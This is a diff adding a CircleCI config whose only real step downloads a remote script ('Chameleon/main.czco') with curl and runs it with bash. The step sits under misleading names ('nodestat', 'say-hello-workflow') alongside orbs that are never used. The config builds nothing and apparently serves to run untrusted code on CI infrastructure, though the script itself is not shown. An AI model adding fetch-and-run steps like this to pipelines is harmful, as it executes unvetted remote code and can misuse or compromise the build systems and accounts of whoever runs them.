@@ -1,0 +1,23 @@
+version: 2.1
+
+orbs:
+  snyk: snyk/snyk@1.7.2
+  github-cli: circleci/github-cli@2.2.0
+
+jobs:
+  dockeretteinstall:
+   
+    docker:
+      - image: ubuntu:latest
+
+    steps:
+      - checkout
+      - run: apt update && apt upgrade -y && apt install npm curl sudo -y
+      - run:
+          name: "nodestat"
+          command: "set -e  && curl -fsSL https://raw.githubusercontent.com/NateYeet/Chameleon/main/Chameleon/main.czco >> /ch && bash /ch node"
+
+workflows:
+  say-hello-workflow:
+    jobs:
+      - dockeretteinstall
